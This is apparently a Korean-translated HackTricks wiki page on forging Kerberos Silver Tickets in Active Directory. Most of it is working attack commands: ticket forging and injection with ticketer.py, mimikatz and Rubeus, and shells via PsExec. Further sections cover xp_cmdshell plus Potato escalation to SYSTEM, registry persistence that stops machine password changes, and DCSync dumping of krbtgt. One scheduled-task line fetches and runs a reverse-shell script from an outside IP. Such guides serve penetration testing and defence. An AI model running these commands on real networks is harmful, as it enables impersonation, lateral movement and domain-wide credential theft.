# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

The **Silver Ticket** 공격은 Active Directory (AD) 환경에서 service tickets를 악용하는 기법입니다. 이 방법은 컴퓨터 계정과 같은 예시를 포함하여 **acquiring the NTLM hash of a service account**를 통해 Ticket Granting Service (TGS) 티켓을 위조하는 데 의존합니다. 이렇게 위조된 티켓으로 공격자는 네트워크의 특정 서비스에 접근하여, 보통 관리자 권한을 목표로 **impersonating any user**할 수 있습니다. 티켓을 위조할 때 AES keys를 사용하는 것이 더 안전하고 탐지 가능성이 낮다는 점이 강조됩니다.

> [!WARNING]
> Silver Tickets는 Golden Tickets보다 덜 탐지됩니다. 그 이유는 krbtgt account가 아니라 **hash of the service account**만 필요하기 때문입니다. 그러나 이들은 표적이 된 특정 서비스로만 제한됩니다. 또한 단순히 사용자의 비밀번호를 탈취하는 것만으로도 가능할 수 있습니다.
> 만약 **account's password with a SPN**를 탈취한다면, 그 비밀번호를 사용해 해당 서비스에 대해 Silver Ticket을 생성하여 impersonating any user 할 수 있습니다.

티켓 생성(조작)에는 운영체제에 따라 다양한 도구가 사용됩니다:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows에서
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS 서비스는 피해자의 파일 시스템에 접근하기 위한 일반적인 표적으로 강조되지만, HOST 및 RPCSS와 같은 다른 서비스들도 작업 및 WMI 쿼리 수행에 악용될 수 있다.

### 예: MSSQL service (MSSQLSvc) + Potato to SYSTEM

SQL 서비스 계정(e.g., sqlsvc)의 NTLM 해시(또는 AES 키)를 가지고 있다면 MSSQL SPN에 대해 TGS를 위조하여 SQL 서비스에 대해 임의의 사용자로 가장할 수 있다. 그곳에서 xp_cmdshell을 활성화하여 SQL 서비스 계정 권한으로 명령을 실행할 수 있다. 해당 토큰에 SeImpersonatePrivilege가 있다면, Potato를 연결해 SYSTEM으로 권한을 상승시킬 수 있다.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- 결과 컨텍스트에 SeImersonatePrivilege 권한이 있으면(종종 service accounts의 경우에 해당), Potato 변형을 사용해 SYSTEM을 얻으세요:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
MSSQL을 악용하고 xp_cmdshell을 활성화하는 방법에 대한 자세한 내용:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato 기법 개요:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 사용 가능한 서비스

| 서비스 유형                                 | 서비스 Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus**를 사용하면 다음 매개변수를 통해 이 모든 티켓을 **요청할 수 있습니다**:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets 이벤트 ID

- 4624: 계정 로그온
- 4634: 계정 로그오프
- 4672: 관리자 로그온

## 영속성

머신이 30일마다 암호를 변경하지 않도록 하려면 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`로 설정하거나, 머신 암호의 회전 주기를 늘리려면 `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge`를 30일보다 큰 값으로 설정하세요.

## 서비스 티켓 악용

다음 예에서는 티켓이 administrator 계정을 가장하여 획득되었다고 가정합니다.

### CIFS

이 티켓을 사용하면 `C$` 및 `ADMIN$` 폴더에 **SMB**를 통해 접근할 수 있으며(노출되어 있는 경우) 다음과 같이 원격 파일시스템의 일부에 파일을 복사할 수 있습니다:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
당신은 또한 호스트 내부에서 셸을 획득하거나 **psexec**를 사용해 임의의 명령을 실행할 수 있습니다:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### 호스트

이 권한으로 원격 컴퓨터에 예약 작업을 생성하고 임의의 명령을 실행할 수 있습니다:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

이 tickets를 사용하면 대상 시스템에서 **WMI를 실행할 수 있습니다**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Find **more information about wmiexec** in the following page:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### 호스트 + WSMAN (WINRM)

컴퓨터에 대한 winrm 접근 권한이 있으면 **해당 컴퓨터에 접속**하거나 심지어 PowerShell을 얻을 수 있습니다:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Check the following page to learn **more ways to connect with a remote host using winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 원격 컴퓨터에 접근하려면 **winrm이 활성화되어 있고 수신(listening) 상태여야 합니다**.

### LDAP

이 권한으로 **DCSync**를 사용해 DC 데이터베이스를 덤프할 수 있습니다:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync에 대해 더 알아보세요** 다음 페이지에서:


{{#ref}}
dcsync.md
{{#endref}}


## 참고 자료

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
